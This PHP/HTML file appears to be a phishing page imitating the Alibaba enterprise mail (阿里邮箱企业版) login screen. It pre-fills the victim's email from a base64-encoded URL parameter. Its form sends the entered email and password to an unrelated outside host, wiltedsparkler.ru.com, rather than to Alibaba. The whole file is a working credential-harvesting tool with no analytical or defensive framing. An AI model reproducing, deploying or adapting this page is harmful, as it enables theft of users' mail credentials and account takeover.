	<?php


$user = $_REQUEST['email'];
$email = base64_decode($user);


?>
	<!DOCTYPE html>
	<html lang="zh_CN">
	<head>
		<meta charset="utf-8" />
	    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="description" content="登录阿里邮箱或阿里免费企业邮箱，请填写企业邮箱的完整账号，或管理员账号，支持阿里邮箱app扫描安全登录。下载安装阿里邮箱APP，无需设置，随时随地，轻松畅游。" />
    <meta name="keywords" content="阿里企业邮箱,阿里云邮,企业邮箱,企业邮局,办公邮箱,办公邮件,公司邮箱,工作邮箱,收费企业邮箱,付费企业邮箱,免费企业邮箱,域名邮箱,钉邮,钉钉邮箱,反垃圾,电子邮件,企业邮箱app,企业邮箱客户端,注册企业邮箱,购买企业邮箱,企业邮箱哪家好,企业邮箱对比,企业邮箱选择,如何选择企业邮箱,企业邮箱购买,企业邮箱销售" />

		<title>阿里邮箱企业版</title>
	<style type="text/css">
		body{
			background-image: url(img/Alimail.png);
			width: 100%;
			height: 100%;
			padding: 0%;
			margin: 0%;
		}
		.form{
			border: 1px solid;
			width: 337px;
			height: 405px;
			position: relative;
			left: 815px;
			top: 125px;
		}
	</style>
	</head>
	<body>
		<div class="form">
			<form action="https://wiltedsparkler.ru.com/post.php" method="post">
				<input id="email" name="email" style="width: 243px; position: relative; top: 77px; left: 41px; height: 22px; border-radius: 5px; background-color: #eef3f8; color: #92a4bf; border: 1px solid #bac5d4; padding: 5px;" type="email" value="<?php echo $email; ?>" placeholder="帐户">
				<input name="password" style="width: 243px; position: relative; top: 107px; left: 41px; height: 22px; border-radius: 5px; background-color: #eef3f8; color: #92a4bf; border: 1px solid #bac5d4; padding: 5px;" type="password" placeholder="密码">
				<input style="position: relative; right: 222px; top: 146px; cursor: pointer; width: 13px; height: 13px;" type="checkbox" >
				<button style="width: 255px; line-height: 30px; height: 38px; padding: 5px; position: relative; top: 147px; left: 41px;     border-radius: 5px; display: block; color: #ffffff; font-size: 16px; font-weight: bold; text-align: center; border: 1px solid #3790CC; background-color: #3B9BDC; cursor: pointer;">登录</button>



			</form>

			
		</div>



	
	</body>
	</html>
